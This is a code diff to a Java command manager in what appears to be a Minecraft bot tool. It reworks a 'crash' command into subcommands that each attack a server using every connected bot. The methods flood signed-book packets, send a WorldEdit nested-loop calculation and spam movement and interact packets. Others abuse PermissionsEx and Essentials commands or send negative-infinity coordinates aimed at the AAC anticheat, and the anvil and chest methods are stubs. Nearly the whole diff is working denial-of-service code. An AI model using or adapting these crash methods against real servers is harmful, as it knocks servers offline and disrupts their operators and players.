@@ -508,144 +508,185 @@ public class ServerCommandManager {
     dispatcher.register(
         literal("crash")
             .then(
-                argument("method", StringArgumentType.greedyString())
+                literal("book")
                     .executes(
                         help(
-                            "Attempts to crash the server",
+                            "Attempts to crash the server with a book",
                             c -> {
-                              var method = StringArgumentType.getString(c, "method");
+                              log.info("Attempting to crash the server with a book");
 
-                              log.info("Attempting to crash the server with method: {}", method);
-
-                              return switch (method) {
-                                case "book" -> {
-                                  try {
-                                    var data = Files.readAllBytes(Path.of("book.cap"));
-                                    var packet =
-                                        new ServerboundCustomPayloadPacket("MC|BSign", data);
-                                    forEveryBot(
-                                        c,
-                                        (bot) -> {
-                                          for (var i = 0; i < 150; i++) {
-                                            bot.sessionDataManager().sendPacket(packet);
-                                          }
-                                          return Command.SINGLE_SUCCESS;
-                                        });
-                                  } catch (IOException e) {
-                                    log.error("Failed to read book.cap", e);
-                                  }
-                                  yield Command.SINGLE_SUCCESS;
-                                }
-                                case "calc" -> {
-                                  forEveryBot(
-                                      c,
-                                      (bot) -> { // Work
-                                        bot.botControl()
-                                            .sendMessage(
-                                                "//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<256;c++){}}}}");
-                                        return Command.SINGLE_SUCCESS;
-                                      });
-                                  yield Command.SINGLE_SUCCESS;
-                                }
-                                case "fly" -> {
-                                  forEveryBot(
-                                      c,
-                                      (bot) -> {
-                                        var botX = bot.sessionDataManager().clientEntity().x();
-                                        var botY = bot.sessionDataManager().clientEntity().y();
-                                        var botZ = bot.sessionDataManager().clientEntity().z();
-
-                                        while (botY < 256) {
-                                          botY += 9;
-                                          var packet =
-                                              new ServerboundMovePlayerPosPacket(
-                                                  true, botX, botY, botZ);
-                                          bot.sessionDataManager().sendPacket(packet);
-                                        }
-
-                                        for (var i = 0; i < 10000; i++) {
-                                          botX += 9;
-                                          var packet =
-                                              new ServerboundMovePlayerPosPacket(
-                                                  true, botX, botY, botZ);
-                                          bot.sessionDataManager().sendPacket(packet);
-                                        }
-
-                                        return Command.SINGLE_SUCCESS;
-                                      });
-                                  yield Command.SINGLE_SUCCESS;
-                                }
-                                case "sleep" -> {
-                                  forEveryBot(
-                                      c,
-                                      (bot) -> {
-                                        // TODO: 17/02/2024 check if there is a specific packet for
-                                        // leaving bed
-                                        var packet =
-                                            new ServerboundInteractPacket(
-                                                bot.sessionDataManager().clientEntity().entityId(),
-                                                InteractAction.INTERACT,
-                                                Hand.MAIN_HAND,
-                                                false);
-
-                                        for (var i = 0; i < 2000; i++) {
-                                          bot.sessionDataManager().sendPacket(packet);
-                                        }
-
-                                        return Command.SINGLE_SUCCESS;
-                                      });
-                                  yield Command.SINGLE_SUCCESS;
-                                }
-                                case "permissionsex" -> { // Work
-                                  forEveryBot(
-                                      c,
-                                      (bot) -> {
-                                        bot.botControl().sendMessage("/promote * a");
-                                        return Command.SINGLE_SUCCESS;
-                                      });
-                                  yield Command.SINGLE_SUCCESS;
-                                }
-                                case "aac" -> {
-                                  // TODO: 17/02/2024 find old version of AAC crack to test
-                                  var packet =
-                                      new ServerboundMovePlayerPosPacket(
-                                          true,
-                                          Double.NEGATIVE_INFINITY,
-                                          Double.NEGATIVE_INFINITY,
-                                          Double.NEGATIVE_INFINITY);
-                                  forEveryBot(
-                                      c,
-                                      (bot) -> {
+                              try {
+                                var data = Files.readAllBytes(Path.of("book.cap"));
+                                var packet = new ServerboundCustomPayloadPacket("MC|BSign", data);
+                                return forEveryBot(
+                                    c,
+                                    (bot) -> {
+                                      for (var i = 0; i < 150; i++) {
                                         bot.sessionDataManager().sendPacket(packet);
-                                        return Command.SINGLE_SUCCESS;
-                                      });
-                                  yield Command.SINGLE_SUCCESS;
-                                }
-                                case "essentials" -> {
-                                  forEveryBot(
-                                      c,
-                                      (bot) -> {
-                                        bot.botControl().sendMessage("/pay * a a");
-                                        return Command.SINGLE_SUCCESS;
-                                      });
-                                  yield Command.SINGLE_SUCCESS;
-                                }
-                                case "anvil" -> {
-                                  // try damage 3 and 16384
-                                  log.error("Anvil crash not implemented yet!");
-                                  yield Command.SINGLE_SUCCESS;
-                                }
-                                case "chest" -> {
-                                  // create huge NBT data on chest and place the most possible chest
-                                  // to "crash" the area
-                                  log.error("Chest crash not implemented yet!");
-                                  yield Command.SINGLE_SUCCESS;
-                                }
-                                default -> {
-                                  log.error("Unknown crash method: {}", method);
-                                  yield Command.SINGLE_SUCCESS;
-                                }
-                              };
+                                      }
+                                      return Command.SINGLE_SUCCESS;
+                                    });
+                              } catch (IOException e) {
+                                log.error("Failed to read book.cap", e);
+                                return 1;
+                              }
+                            })))
+            .then(
+                literal("calc")
+                    .executes(
+                        help(
+                            "Attempts to crash the server with a calculation",
+                            c -> {
+                              log.info("Attempting to crash the server with a calculation");
+
+                              return forEveryBot(
+                                  c,
+                                  (bot) -> {
+                                    bot.botControl()
+                                        .sendMessage(
+                                            "//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<256;c++){}}}}");
+                                    return Command.SINGLE_SUCCESS;
+                                  });
+                            })))
+            .then(
+                literal("fly")
+                    .executes(
+                        help(
+                            "Attempts to crash the server with flying",
+                            c -> {
+                              log.info("Attempting to crash the server with flying");
+
+                              return forEveryBot(
+                                  c,
+                                  (bot) -> {
+                                    var botX = bot.sessionDataManager().clientEntity().x();
+                                    var botY = bot.sessionDataManager().clientEntity().y();
+                                    var botZ = bot.sessionDataManager().clientEntity().z();
+
+                                    while (botY < 256) {
+                                      botY += 9;
+                                      var packet =
+                                          new ServerboundMovePlayerPosPacket(
+                                              true, botX, botY, botZ);
+                                      bot.sessionDataManager().sendPacket(packet);
+                                    }
+
+                                    for (var i = 0; i < 10000; i++) {
+                                      botX += 9;
+                                      var packet =
+                                          new ServerboundMovePlayerPosPacket(
+                                              true, botX, botY, botZ);
+                                      bot.sessionDataManager().sendPacket(packet);
+                                    }
+
+                                    return Command.SINGLE_SUCCESS;
+                                  });
+                            })))
+            .then(
+                literal("sleep")
+                    .executes(
+                        help(
+                            "Attempts to crash the server with sleeping",
+                            c -> {
+                              log.info("Attempting to crash the server with sleeping");
+
+                              return forEveryBot(
+                                  c,
+                                  (bot) -> {
+
+                                    // TODO: 17/02/2024 check if there is a specific packet for
+                                    // leaving bed
+                                    var packet =
+                                        new ServerboundInteractPacket(
+                                            bot.sessionDataManager().clientEntity().entityId(),
+                                            InteractAction.INTERACT,
+                                            Hand.MAIN_HAND,
+                                            false);
+
+                                    for (var i = 0; i < 2000; i++) {
+                                      bot.sessionDataManager().sendPacket(packet);
+                                    }
+
+                                    return Command.SINGLE_SUCCESS;
+                                  });
+                            })))
+            .then(
+                literal("permissionsex")
+                    .executes(
+                        help(
+                            "Attempts to crash the server with Permissionsex",
+                            c -> {
+                              log.info("Attempting to crash the server with Permissionsex");
+
+                              return forEveryBot(
+                                  c,
+                                  (bot) -> {
+                                    bot.botControl().sendMessage("/promote * a");
+                                    return Command.SINGLE_SUCCESS;
+                                  });
+                            })))
+            .then(
+                literal("aac")
+                    .executes(
+                        help(
+                            "Attempts to crash the server with AAC",
+                            c -> {
+                              log.info("Attempting to crash the server with AAC");
+                              // TODO: 17/02/2024 find old version of AAC crack to test
+                              var packet =
+                                  new ServerboundMovePlayerPosPacket(
+                                      true,
+                                      Double.NEGATIVE_INFINITY,
+                                      Double.NEGATIVE_INFINITY,
+                                      Double.NEGATIVE_INFINITY);
+                              return forEveryBot(
+                                  c,
+                                  (bot) -> {
+                                    bot.sessionDataManager().sendPacket(packet);
+                                    return Command.SINGLE_SUCCESS;
+                                  });
+                            })))
+            .then(
+                literal("essentials")
+                    .executes(
+                        help(
+                            "Attempts to crash the server with Essentials",
+                            c -> {
+                              log.info("Attempting to crash the server with Essentials");
+
+                              return forEveryBot(
+                                  c,
+                                  (bot) -> {
+                                    bot.botControl().sendMessage("/pay * a a");
+                                    return Command.SINGLE_SUCCESS;
+                                  });
+                            })))
+            .then(
+                literal("anvil")
+                    .executes(
+                        help(
+                            "Attempts to crash the server with an anvil",
+                            c -> {
+                              log.info("Attempting to crash the server with an anvil");
+
+                              log.error("Anvil crash is not implemented yet!");
+
+                              // try damage 3 and 16384
+                              return Command.SINGLE_SUCCESS;
+                            })))
+            .then(
+                literal("chest")
+                    .executes(
+                        help(
+                            "Attempts to crash the server with a chest",
+                            c -> {
+                              log.info("Attempting to crash the server with a chest");
+
+                              log.error("Chest crash is not implemented yet!");
+
+                              // create huge NBT data on chest and place the most possible chest
+                              // to "crash" the area
+                              return Command.SINGLE_SUCCESS;
                             }))));
 
     SoulFireAPI.postEvent(new DispatcherInitEvent(dispatcher));
